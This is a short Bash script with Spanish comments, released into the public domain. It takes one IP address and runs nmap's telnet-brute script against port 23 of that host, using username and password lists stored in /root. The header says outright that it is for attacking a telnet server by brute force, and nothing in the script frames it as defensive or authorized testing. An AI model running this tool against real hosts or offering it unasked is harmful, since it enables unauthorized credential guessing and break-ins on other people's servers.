#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

#------------------------------------------------------------------------
#  Script de NiPeGun para atacar por fuerza bruta un servidor de telnet
#------------------------------------------------------------------------

CantArgsCorrectos=1
ArgsInsuficientes=65

ColorRojo='\033[1;31m'
ColorVerde='\033[1;32m'
FinColor='\033[0m'

if [ $# -ne $CantArgsCorrectos ]
  then
    echo ""
    echo "-----------------------------------------------------------------------------------"
    echo -e "${ColorRojo}Mal uso del script.${FinColor} El uso correcto sería:"
    echo ""
    echo -e "$0 ${ColorVerde}[IPDelHostAAtacar]${FinColor}"
    echo ""
    echo "Ejemplo:"
    echo ""
    echo "$0 192.168.0.1"
    echo ""
    echo "Recuerda que antes de usar este script tienes que tener creados estos dos archivos:"
    echo ""
    echo "/root/usuarios.txt"
    echo "/root/claves.txt"
    echo ""
    echo "-----------------------------------------------------------------------------------"
    echo ""
    exit $ArgsInsuficientes
  else
    nmap -p 23 --script telnet-brute --script-args userdb=/root/usuarios.txt,passdb=/root/claves.txt,telnet-brute.timeout=8s $1
fi

